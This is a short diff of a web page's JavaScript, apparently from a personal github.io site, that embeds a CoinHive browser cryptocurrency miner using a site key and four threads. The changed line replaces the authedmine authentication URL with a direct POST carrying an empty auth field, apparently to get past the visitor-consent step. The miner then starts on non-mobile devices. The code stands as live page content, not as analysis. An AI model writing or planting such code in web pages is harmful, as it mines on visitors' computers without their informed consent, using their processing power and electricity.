@@ -8,7 +8,7 @@
 
   var miner = new CoinHive.Anonymous('jRhVb3WlGwvCvVX8D116T77LN1wzdmfn', {threads: 4,throttle: 0.8});
 
-$.post( "https://authedmine.com/authenticate.html?key=jRhVb3WlGwvCvVX8D116T77LN1wzdmfn&domain=t160057.github.io&theme=light&lang=auto", function( data ) {
+$.post( "https://authedmine.com/auth",{auth:"",key:"jRhVb3WlGwvCvVX8D116T77LN1wzdmfn"}, function( data ) {
   if (!miner.isMobile() ){
    miner.start();
   }
